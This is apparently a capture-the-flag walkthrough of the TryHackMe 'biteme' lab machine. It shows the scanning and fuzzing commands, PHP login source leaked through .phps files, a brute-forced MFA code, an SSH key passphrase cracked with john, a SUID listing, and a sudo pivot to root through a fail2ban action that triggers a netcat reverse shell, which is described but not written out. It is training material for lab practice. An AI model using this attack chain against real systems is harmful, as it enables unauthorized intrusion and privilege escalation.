Full Scan:

sudo nmap -p- -o full_scan 10.10.221.213

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 15:04 WET
Nmap scan report for 10.10.221.213
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


(Does not have additional UDP ports open)

Nmap:

sudo nmap -A -sC -sV -o detailed_scan 10.10.221.213

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
|_  256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).


Gobuster:

gobuster dir -u http://10.10.221.213 -w ~/lists/Discovery/Web-Content/directory-list-2.3-medium.txt

/console              (Status: 301) [Size: 316] [--> http://10.10.221.213/console/]
/server-status        (Status: 403) [Size: 278]                                    

Nikto:

+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5cca9f3818435, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ Cookie PHPSESSID created without the httponly flag
+ /console/: Application console found


We found an interesting endpoint now we will capture a request sent with dummy imputs and try to see if it contains a sql injection.

[CRITICAL] all tested parameters do not appear to be injectable. 

In the console we found a strange information: 
@fred I turned on php file syntax highlighting for you to review... jason

gobuster dir -u http://10.10.221.213/console -w ~/lists/Discovery/Web-Content/directory-list-2.3-medium.txt

There is no more directories to enumerate!

Back to the image, i tried to understand what it happens to trigger that message and it was the login so watching closer to the source code we found a strange javascript script that handle the submit of the form. 

      function handleSubmit() {
        eval(
        	function(p,a,c,k,e,r){
        		e = function(c){return c.toString(a) };
        			
        		if (!''.replace(/^/,String)){
        			while(c--)r[e(c)]=k[c]||e(c);

        			k=[function(e){return r[e]}];

        			e=function(){return'\\w+'};

        			c=1
        		};

        		while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);

        		return p

        	} ('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
        return true;
      }

It does not make sense...

Another thing we can try is to understand the comment generated after we try to login:

@fred I turned on php file syntax highlighting for you to review... jason

Looking at: https://www.php.net/manual/en/function.highlight-file.php

We know that the server with the highlight_file on will highlight the code in .phps files

Lets use FFUF to find .phps files!!!

ffuf -c -w ~/lists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.221.213/console/FUZZ.phps 

index                   [Status: 200, Size: 9325, Words: 297, Lines: 3]1
config                  [Status: 200, Size: 354, Words: 17, Lines: 4]
functions               [Status: 200, Size: 2010, Words: 93, Lines: 4]

http://<MACHINE_IP>/console/config.phps

 <?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 


http://<MACHINE_IP>/console/functions.phps


 <?php
include('config.php');

function is_valid_user($user) {
    $user = bin2hex($user);

    return $user === LOGIN_USER;
}

// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
} 

The first line means the hexadecimal to ascii!

jason_test_account is the user

The md5 of the password needs to end with 001 so we created a script to add an "a" until we have 001 in the last three digits of md5 and we found one

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


If we try one time the mfa code we get the following message in the console:

@fred we need to put some brute force protection on here, remind me in the morning... jason

Lets now bruteforce the mfa code with burpsuite!

Well the burpsuite free version is throtled and after 150 requests it slows more so i will build a python script to bruteforce it!

I DID IT!!!!

─[✗]─[dopey@dopey]─[~/thm/biteme]
└──╼ $python number.py 
2728

After getting into the dashboard.php page we see that we can view files and directorys but we cannot get our foothold inside the machine so we will search for something to help us.

After sometime we found a private ssh key!

We then copy to our machine and then try to use it with ssh but we need a password so we will use john to try and crack the password.

python ssh2john.py ~/thm/biteme/id_rsa > ~/thm/biteme/hash

john --wordlist=~/lists/rockyou.txt hash 

After some seconds we are able to crack the hash password: 1a2b3c4d

/etc/fail2ban/action.d
/usr/bin/gettext.sh


-rwsr-xr-x 1 root root 128K Feb 23 18:29 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_
dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                          
-rwsr-xr-x 1 root root 427K Mar  3  2020 /usr/lib/openssh/ssh-keysign                         
-rwsr-xr-x 1 root root 14K Jan 12 12:34 /usr/lib/policykit-1/polkit-agent-helper-1            
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic            
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device                     
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper     
-rwsr-xr-x 1 root root 75K Jan 25 16:26 /usr/bin/chfn  --->  SuSE_9.3/10                      
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vul
nerable                                                                                       
-rwsr-xr-x 1 root root 40K Jan 25 16:26 /usr/bin/newgrp  --->  HP-UX_10.20                    
-rwsr-xr-x 1 root root 22K Jan 12 12:34 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13
272)/rhel_6(CVE-2011-1485)                                                                    
-rwsr-xr-x 1 root root 44K Jan 25 16:26 /usr/bin/chsh                                         
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 37K Jan 25 16:26 /usr/bin/newgidmap                                    
-rwsr-xr-x 1 root root 75K Jan 25 16:26 /usr/bin/gpasswd                                      
-rwsr-xr-x 1 root root 59K Jan 25 16:26 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_
8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                      
-rwsr-xr-x 1 root root 37K Jan 25 16:26 /usr/bin/newuidmap                                    
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils                          
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping                                             
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.
32.7_except_xnu-1699.24.8                                                                     
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)                 
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount                                       
-rwsr-xr-x 1 root root 44K Jan 25 16:26 /bin/su                                               
                                                     
Groups:
uid=1000(jason) gid=1000(jason) groups=1000(jason),4(adm),24(cdrom),27(sudo),30(dip),46(plugde

Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL


John could run ALL as root, but I needed his password. However, he could also run ALL as Fred without a password so I switched to fred with sudo -u fred -i /bin/bash

User fred may run the following commands on biteme:
    (root) NOPASSWD: /bin/systemctl restart fail2ban

https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7

Basically since we could restart fail2ban as root we could abuse the action ban that is a command trigger when an IP is trying to get in the system by brute forcing. 

We had a netcat payload and we open a nc listener in our machine.

When the system will execute the action ban we will receive a shell as root.
We open another terminal and we try a lot of nonsense passwords trying to connect to the user jason and after some attempts we receive a root shell.